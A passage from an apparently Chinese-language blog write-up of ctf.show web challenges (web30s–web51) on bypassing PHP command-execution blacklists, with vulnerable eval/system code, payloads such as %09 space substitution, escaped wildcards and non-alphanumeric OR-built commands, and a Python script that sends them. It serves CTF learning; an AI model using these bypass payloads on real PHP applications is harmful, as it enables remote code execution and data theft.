invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ol type="1"><li>使用其他的执行系统命令的函数，例如echo</li></ol><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">url/?c=echo `tac fla*`;<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>转接口也可解决：</li></ol><figure><img src="/2024/12/03/Web/1733230312813.png" alt="1733230312813"><figcaption aria-hidden="true">1733230312813</figcaption></figure><h4 id="web31">web31</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;   <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ol type="1"><li>echo</li></ol><p>过滤空格，可使用%09代替；另一方面，echo()也可以使用</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">url/?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>echo<span class="hljs-variable">%09</span>`tac<span class="hljs-variable">%09</span>f*`<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>使用passthru("")替代</li></ol><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">url/<span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&quot;tac%09f*&quot;</span>);<br></code></pre></td></tr></table></figure><ol start="3" type="1"><li>转接口</li></ol><figure><img src="/2024/12/03/Web/1733230333010.png" alt="1733230333010"><figcaption aria-hidden="true">1733230333010</figcaption></figure><h4 id="web40">web40</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>思路：禁止使用数字，引号，中文括号，调用无参数函数。</p><p>解法一：</p><p>首先，打印当前目录下的文件：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">url/?<span class="hljs-attribute">c</span>=print_r(scandir(current(localeconv())))<br></code></pre></td></tr></table></figure><p>命令解析：</p><ul><li>localeconv()：它返回一个数组，包含了当前区域设置（locale）的数值格式信息，比如小数点符号、千位分隔符等;</li><li>current()：获取数组中的元素，通常是数组的第一个元素；</li><li>scandir()：用于扫描指定目录，返回<strong>名称数组</strong></li><li>print_r()：以方便阅读的形式打印变量</li></ul><p>scandir(‘.’)：表示扫描当前工作目录，由于过滤<code>'</code>和<code>.</code>，使用current(localeconv())来获取<code>'.'</code>；</p><p>也可以使用getpwd()来代替：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">url/?<span class="hljs-attribute">c</span>=print_r(scandir(getcwd()));<br></code></pre></td></tr></table></figure><p><strong>PHP中的数组操作：</strong></p><p>each() 返回数组中当前的键/值对并将数组指针向前移动一步</p><p>reset()将内部指针指向数组中的第一个元素，并返回该元素</p><p>end() 将数组的内部指针指向最后一个单元，并返回该元素</p><p>next() 将数组中的内部指针向前移动一位，并返回该元素</p><p>prev() 将数组中的内部指针倒回一位，并返回该元素</p><p>array_reverse() 以相反的元素顺序返回数组</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">url/<span class="hljs-string">?c</span>=show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(getcwd()))));<br></code></pre></td></tr></table></figure><p>可以利用<code>show_source()</code>或者<code>highlight_file()</code>输出文件内容。</p><p>解法二：</p><p>利用<code>get_defined_vars()</code>：返回的是<strong>二维数组</strong>，包含已定义的变量名及变量的值，例如GET、POST、FILE等等。</p><p>首先查看当前定义的变量：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">url/?<span class="hljs-attribute">c</span>=var_dump(get_defined_vars());<br></code></pre></td></tr></table></figure><figure><img src="/2024/12/03/Web/1733230363870.png" alt="1733230363870"><figcaption aria-hidden="true">1733230363870</figcaption></figure><p>利用POST传参执行系统命令：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">url/?c=<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">reset</span>(<span class="hljs-keyword">next</span>(get_defined_vars())));<br><span class="hljs-regexp">//p</span>ost传参<br><span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>利用GET传参：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">url/?c=<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">next</span>(<span class="hljs-keyword">reset</span>(get_defined_vars())));&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac fl*&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="web41">web41</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$c</span>);&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码执行，禁用数字和字母，可以采用非字母数字进行运算来构造对应的命令，这里使用or运算。</p><p>生成<strong>非过滤字符进行or运算</strong>可生成的字符的参考字典：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/* author yu22x */</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br>                <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>                <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>                <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                        <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>                &#125;<br>        &#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><br></code></pre></td></tr></table></figure><p>利用该字典生成对应的命令，命令在本地进行url解码后上传（使用urllib.parse.unquote()函数，将一个URL 编码的字符串解码为其原始的、未编码的形式），直接在本地发包：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python">/* author yu22x */      <br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>url = <span class="hljs-string">&quot;http://xxx.challenge.ctf.show/&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function:&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command:&quot;</span>))<br>   <span class="hljs-comment">###发包</span><br>   data = &#123;<br>       <span class="hljs-string">&#x27;c&#x27;</span> : urllib.parse.unquote(param)<br>   &#125;<br>   r = requests.post(url,data=data)<br>   <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h4 id="web42">web42</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>;</code>命令分隔：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">url/?<span class="hljs-attribute">c</span>=tac fl*;<br></code></pre></td></tr></table></figure><h4 id="web43">web43</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>||</code> <code>&amp;&amp;</code>进行命令分隔：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">url/?<span class="hljs-attribute">c</span>=tac f* ||<br></code></pre></td></tr></table></figure><h4 id="web44">web44</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/;|cat|flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通配符绕过即可。</p><h4 id="web45">web45</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>%09绕过空格即可。</p><h4 id="web46">web46</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>仍可使用%09，不属于绕过的数字范畴。</p><h4 id="web47">web47</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>同上。</p><h4 id="web48">web48</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>同上。</p><h4 id="web49">web49</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>解法一：仍可以使用%09代替空格，不属于%绕过的范畴</p><p>解法二：<code>&lt;&gt;</code>和<code>?</code>结合使用会出错，可以使用<code>\</code>进行<strong>转义字符</strong>（也可以使用<code>''</code>或者<code>'</code>，两个单引号和一个单引号）绕过来替代通配符</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">url/?c=tac<span class="hljs-variable">&lt;&gt;</span>fla\g.php||<br></code></pre></td></tr></table></figure><h4 id="web50">web50</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>%09终于还是被过滤了。</p><p>同上使用转义字符绕过。</p><h4 id="web51">web51</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span 